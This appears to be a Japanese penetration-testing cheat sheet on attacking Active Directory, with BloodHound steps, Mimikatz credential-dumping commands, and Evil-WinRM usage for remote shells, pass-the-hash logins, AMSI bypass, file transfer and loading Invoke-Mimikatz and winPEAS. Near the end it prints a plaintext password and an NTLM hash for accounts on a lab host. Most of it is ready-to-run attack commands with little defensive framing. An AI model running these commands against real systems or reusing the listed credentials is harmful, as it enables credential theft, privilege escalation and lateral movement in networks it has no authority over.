## BloodHound
BloodHound ( https://github.com/BloodHoundAD/BloodHound) とは、グラフ理論にもとづき、Active Directory環境の意図せぬ関係性を明らかにするためのツールです。
これにより、低特権ユーザーをDomain Adminsへ権限昇格するなど、他のユーザーやグループへ移行するためのパスを発見することができます。
https://qiita.com/v_avenger/items/56ef4ae521af6579c058
ターゲットAD上でSharphound.exeを実行する
作成された日付入りのzipファイルをkali上に転送する
neo4jの起動


②BloodHoundの起動


転送したファイルをアップロードする

---

## Mimikatz
privilege::debug
sekurlsa::logonpasswords 
#hashes and plaintext passwords
lsadump::sam
lsadump::lsa /patch #both these dump SAM

#OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"  
![image](https://github.com/user-attachments/assets/80751d7c-e8fe-4d86-a690-98426942fdff)
---

## Evil-Winrm
WinRMとは
「Windows Remote Management (WinRM)」とは、MicrosoftによるWS-Management Protocolの実装です。これにより、さまざまなベンダーのハードウェアとオペレーティングシステムの相互運用を可能にし、システム管理者の負担を軽減することを目指しています。
一方で、被害者のマシンで、WinRMサービスが有効になっている場合、環境内における「Lateral Movement（横展開)」に利用可能な方法の一つになります。
MITER ATT＆CKが示す「ATT&CK Matrix for Enterprise」では、「TA0008: Lateral Movement」戦術（Tactic）における戦法（Technique）の一つとして「T1028: Windows Remote Management」を分類しています。
また、「CAPEC（Common Attack Pattern Enumeration and Classification：共通攻撃パターン一覧）」では、「CAPEC-555：盗まれた資格情報を使用したリモートサービス」として分類しています。
要素名	概要	ID
Technique	攻撃に使われる技術（戦法）	T1028
Tactics	戦術：使われた技術によって達成する（目指す）ゴール	TA0008
		
		
		
		Evil-WinRM
Evil-WinRMツールは、WinRMサービスが有効（通常は5985/tcpで応答）かつ、資格情報とアクセス許可がある場合に使用することのできるリモートシェルプログラムです。
Evil-WinRMツールを介することで、リモートのWindowsサーバーで稼働しているWinRMサービスに接続することができ、インタラクティブなPowerShellを取得することができます。

##winrm service discovery
nmap -p5985,5986 <IP>
5985 - plaintext protocol
5986 - encrypted

##Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S 
#if 5986 port is open

##Login with Hash
evil-winrm -i <IP> -u user -H ntlmhash

##Login with key
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S 
#-c for public key and -k for private key

##Logs
evil-winrm -i <IP> -u user -p pass -l

##File upload and download
upload <file>
download <file> <filepath-kali> 
#not required to provide path all time

##Loading files direclty from Kali location
evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell 
#場所は異なる場合があります
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
menu 
# to view commands
#実行するコマンドはいくつかあります
#これは、バイナリを実行する例です
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe![image](https://github.com/user-attachments/assets/3f9ef784-7508-431b-9423-8619fc59e637)


パスワードログイン
evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
![image](https://github.com/user-attachments/assets/7020f363-a6ca-46b9-9f53-37b00809c45a)

ハッシュ値によるログイン
evil-winrm -i 10.10.11.14 -u localadmin -H 9aa582783780d1546d62f2d102daefae
![image](https://github.com/user-attachments/assets/422c7f6c-7d6a-47ae-a374-947c13d39b0b)

![image](https://github.com/user-attachments/assets/764171ae-cf49-4710-95a5-508452d37fe3)
